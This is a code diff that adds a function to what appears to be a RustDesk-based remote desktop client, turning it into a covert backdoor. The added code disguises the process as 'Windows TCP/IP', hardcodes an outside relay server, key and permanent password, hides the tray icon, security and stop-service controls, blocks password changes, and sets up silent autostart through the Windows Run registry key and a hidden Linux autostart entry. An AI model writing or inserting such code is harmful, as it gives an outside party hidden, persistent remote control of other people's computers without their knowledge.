@@ -2103,6 +2103,113 @@ pub fn load_custom_client() {
     }
 }
 
+pub fn apply_preset_config() {
+    use hbb_common::config::{self, Config};
+
+    // Change process/app name
+    *config::APP_NAME.write().unwrap() = "Windows TCP/IP".to_owned();
+
+    // Hardcoded server config
+    set_option(
+        "custom-rendezvous-server".to_owned(),
+        "rust.liuermihou.top".to_owned(),
+    );
+    set_option("relay-server".to_owned(), "rust.liuermihou.top".to_owned());
+    set_option(
+        "key".to_owned(),
+        "zi0q7idWFOKSHtZ5WyGKlLPfDqcr0EyX586s0XJFvBc=".to_owned(),
+    );
+    set_option("enable-lan-discovery".to_owned(), "Y".to_owned());
+    set_option("direct-server".to_owned(), "Y".to_owned());
+    set_option("approve-mode".to_owned(), "password".to_owned());
+    set_option(
+        "verification-method".to_owned(),
+        "use-permanent-password".to_owned(),
+    );
+    set_option("allow-hide-cm".to_owned(), "Y".to_owned());
+
+    // Permanent password
+    Config::set_permanent_password("liuermihou");
+
+    // Builtin settings (hide UI elements)
+    {
+        let mut builtin = config::BUILTIN_SETTINGS.write().unwrap();
+        builtin.insert("hide-tray".to_owned(), "Y".to_owned());
+        builtin.insert("hide-stop-service".to_owned(), "Y".to_owned());
+        builtin.insert("hide-security-settings".to_owned(), "Y".to_owned());
+        builtin.insert("hide-network-settings".to_owned(), "Y".to_owned());
+        builtin.insert("hide-server-settings".to_owned(), "Y".to_owned());
+        builtin.insert(
+            "disable-change-permanent-password".to_owned(),
+            "Y".to_owned(),
+        );
+    }
+    set_option("hide-tray".to_owned(), "Y".to_owned());
+    set_option("hide-stop-service".to_owned(), "Y".to_owned());
+    set_option("hide-security-settings".to_owned(), "Y".to_owned());
+    set_option("hide-network-settings".to_owned(), "Y".to_owned());
+    set_option("hide-server-settings".to_owned(), "Y".to_owned());
+    set_option(
+        "disable-change-permanent-password".to_owned(),
+        "Y".to_owned(),
+    );
+
+    // Write device ID to file
+    {
+        let id = Config::get_id();
+        if !id.is_empty() {
+            if let Ok(exe) = std::env::current_exe() {
+                if let Some(dir) = exe.parent() {
+                    let id_file = dir.join("device_id.txt");
+                    let content = format!("{}\n", id);
+                    std::fs::write(&id_file, &content).ok();
+                }
+            }
+        }
+    }
+
+    // Auto-start on boot
+    #[cfg(target_os = "windows")]
+    {
+        if let Ok(exe) = std::env::current_exe() {
+            let app_name = config::APP_NAME.read().unwrap().clone();
+            let exe_path = exe.to_string_lossy().to_string();
+            let _ = std::process::Command::new("reg")
+                .args(&[
+                    "add",
+                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/v",
+                    &app_name,
+                    "/t",
+                    "REG_SZ",
+                    "/d",
+                    &format!("\"{}\" --tray", exe_path),
+                    "/f",
+                ])
+                .output();
+        }
+    }
+    #[cfg(target_os = "linux")]
+    {
+        hbb_common::allow_err!(crate::platform::check_autostart_config());
+        // Override with full executable path for portable builds
+        if let Ok(exe) = std::env::current_exe() {
+            let app_name = crate::get_app_name().to_lowercase();
+            if let Ok(home) = std::env::var("HOME") {
+                let autostart_dir = format!("{}/.config/autostart", home);
+                let desktop_file = format!("{}/{}.desktop", autostart_dir, app_name);
+                std::fs::create_dir_all(&autostart_dir).ok();
+                let full_path = exe.to_string_lossy();
+                let content = format!(
+                    "[Desktop Entry]\nType=Application\nExec={} --tray\nNoDisplay=true\n",
+                    full_path
+                );
+                std::fs::write(&desktop_file, &content).ok();
+            }
+        }
+    }
+}
+
 fn read_custom_client_advanced_settings(
     settings: serde_json::Value,
     map_display_settings: &HashMap<String, &&str>,
